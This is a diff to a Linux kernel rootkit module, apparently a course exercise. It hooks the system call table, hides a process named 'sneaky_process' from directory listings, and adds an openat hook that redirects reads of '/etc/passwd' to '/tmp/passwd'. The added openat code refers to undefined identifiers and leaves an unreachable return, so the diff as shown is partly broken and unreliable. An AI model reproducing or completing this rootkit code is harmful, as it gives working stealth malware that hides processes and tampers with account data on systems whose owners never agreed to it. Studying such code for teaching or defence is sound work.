@@ -22,9 +22,6 @@ static unsigned long *sys_call_table;
 //   char d_name[]; /* Filename (null-terminated) */
 // };
 
-static char *pid = "";
-module_param(pid, charp, 0);
-MODULE_PARM_DESC(pid, "The process id of sneaky program");
 
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
@@ -58,7 +55,7 @@ asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
   ssize_t bpos;
   nread = original_getdents64(regs);
   for(bpos=0;bpos<nread;){
-    d = (struct linux_dirent64 *)((char *)dirptr + bpos);
+    d = (struct linux_dirent64 *)((char *)regs->si + bpos);
     if (strcmp(d->d_name, "sneaky_process") == 0){
       int current_size = d->d_reclen;
       int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
@@ -98,6 +95,11 @@ asmlinkage int (*original_openat)(struct pt_regs *regs);
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   // Implement the sneaky part here
+  if (strcmp(pathname, "/etc/passwd") == 0) {
+    char newPath[] = "/tmp/passwd";
+    copy_to_user((void *)pathname, newPath,strlen(newPath)); 
+  }
+  return original_call(pathname, flags);
 
   return (*original_openat)(regs);
 }
